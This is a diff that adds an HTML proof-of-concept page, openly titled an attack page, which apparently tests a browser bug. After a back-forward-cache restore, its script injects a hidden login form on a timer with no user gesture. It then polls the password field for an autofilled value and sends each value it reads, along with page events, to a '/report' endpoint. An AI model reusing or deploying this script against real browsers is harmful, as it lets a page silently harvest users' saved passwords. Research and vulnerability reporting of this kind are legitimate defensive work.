@@ -1,0 +1,59 @@
+<!doctype html><html><head><title>AttackPage</title></head>
+<body>
+<h1>Attack Page (BFCache password-gate bypass, end-to-end)</h1>
+<button id="benign" autofocus>Click me (benign, no relation to any login form)</button>
+<a id="tob" href="neutral.html">Go to neutral page</a>
+<div id="log"></div>
+<script>
+function report(event, extra){
+  extra = extra || {};
+  var qs = 'event='+encodeURIComponent(event);
+  for (var k in extra) qs += '&'+k+'='+encodeURIComponent(extra[k]);
+  qs += '&t='+Date.now();
+  document.getElementById('log').innerHTML += event + ': ' + JSON.stringify(extra) + '<br>';
+  fetch('/report?'+qs).catch(()=>{});
+}
+
+report('load', {hasBeenActive: navigator.userActivation.hasBeenActive});
+
+document.getElementById('benign').addEventListener('click', () => {
+  report('click', {hasBeenActive: navigator.userActivation.hasBeenActive});
+});
+
+function injectLoginForm(reason){
+  if (document.getElementById('injected-pw')) return;
+  var form = document.createElement('form');
+  form.action = '/login';
+  form.method = 'POST';
+  var u = document.createElement('input');
+  u.type = 'text'; u.name = 'username'; u.autocomplete = 'username'; u.id = 'injected-user';
+  var p = document.createElement('input');
+  p.type = 'password'; p.name = 'password'; p.autocomplete = 'current-password'; p.id = 'injected-pw';
+  form.appendChild(u); form.appendChild(p);
+  document.body.appendChild(form);
+  report('injected-form', {reason: reason, hasBeenActive: navigator.userActivation.hasBeenActive});
+
+  // Poll the injected password field's real JS-visible .value for a few seconds,
+  // with ZERO further gesture -- this is the actual reveal check.
+  var checks = 0;
+  var iv = setInterval(() => {
+    checks++;
+    var val = p.value;
+    report('poll-injected-value', {value: val, checks: checks, hasBeenActive: navigator.userActivation.hasBeenActive});
+    if (val || checks >= 15) clearInterval(iv);
+  }, 500);
+}
+
+window.addEventListener('pageshow', (e) => {
+  report('pageshow', {persisted: e.persisted, hasBeenActive: navigator.userActivation.hasBeenActive});
+  if (e.persisted) {
+    // Genuine BFCache restore. Inject the login form now, with NO fresh
+    // gesture on this restored page -- purely a timer callback.
+    setTimeout(() => injectLoginForm('bfcache-restore-timer'), 300);
+  }
+});
+window.addEventListener('pagehide', (e) => {
+  navigator.sendBeacon('/report?event=pagehide&persisted='+e.persisted+'&t='+Date.now());
+});
+</script>
+</body></html>
